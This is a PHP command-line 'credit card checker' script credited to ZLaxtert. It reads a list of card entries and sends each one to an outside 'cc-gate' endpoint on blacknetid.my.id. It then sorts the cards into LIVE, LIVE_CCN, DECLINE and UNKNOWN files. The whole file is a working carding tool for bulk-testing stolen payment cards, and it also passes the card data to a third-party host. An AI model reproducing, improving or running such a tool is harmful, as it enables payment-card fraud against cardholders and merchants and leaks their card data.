<?php
          
  
    /////////RECODE GAK MASALAH///////
        ////ASAL JANGAN DI JUAL////
          ////Author ZLaxtert////

         

echo "\e[35;1m =========[CREDIT CARD CHECKER | STRIPE]=========\n";
echo "\e[36;1m ==      ___        ___    ____    ___         ==\n";
echo "\e[36;1m ==     ||   ==   ||===   /    \  ||   ==      ==\n";
echo "\e[36;1m ==     ||    ==  ||     ||    || ||    ==     ==\n";
echo "\e[36;1m ==     ||    ==  ||==   ||____|| ||    ==     ==\n";
echo "\e[36;1m ==     ||   ==   ||     ||----|| ||   ==      ==\n";
echo "\e[36;1m ==     || ==     ||===  ||    || || ==        ==\n";
echo "\e[36;1m ==                                            ==\n";  
echo "\e[33;1m ==      /\/\/\FuCk Y0uR 5y5T3M 404/\/\/\      ==\n";
echo "\e[36;1m ==                                            ==\n";
echo "\e[1;32m ===============[Code By ZLaxtert]===============\n";
echo "\e[35;1m ===========[Https://blacknetid.my.id]===========\n\n";
   echo "\e[33;1m Enter Your List : ";
   $list = trim(fgets(STDIN));
   echo "\e[1;32m \n
   \n =========[+] Loading APIs... [+]=========\n";
   $open = fopen($list,"r");
   $size = filesize($list);
   $read = fread($open,$size);
   $list = explode("\r\n",$read);
   foreach($list as $lista){
     
      /////===[This is APIs]
 $check = "https://blacknetid.my.id/cc-gate3/cli.php?fuck=".$lista."&sk=";
 $ch = curl_init();
 curl_setopt($ch,CURLOPT_URL,$check);
 curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
 $result = curl_exec($ch);
 if (preg_match('/#Declined/', $result)){
      file_put_contents("DECLINE.txt", $lista.PHP_EOL, FILE_APPEND);
          echo "\e[35;1m[+] DIE ".$result."\n";
 }else if (preg_match('/#DECLINE/', $result)){
      file_put_contents("DECLINE.txt", $lista.PHP_EOL, FILE_APPEND);
          echo "\e[35;1m[+] DIE ".$result."\n";
  }else if (preg_match('/#LIVE/', $result)){    
      file_put_contents("LIVE.txt", $lista.PHP_EOL, FILE_APPEND);
          echo "\e[38;1m[+] LIVE ".$result."\n";
 }else if (preg_match('/#LIVE_CCN/', $result)){    
      file_put_contents("LIVE_CNN.txt", $lista.PHP_EOL, FILE_APPEND);
          echo "\e[36;1m[+] LIVE_CCN ".$result."\n";
 }else{
      file_put_contents("UNKNOWN.txt", $lista.PHP_EOL, FILE_APPEND);
          echo "\e[37;1m[+] UNKNOWN ".$result."\n";
        }
    }
?>
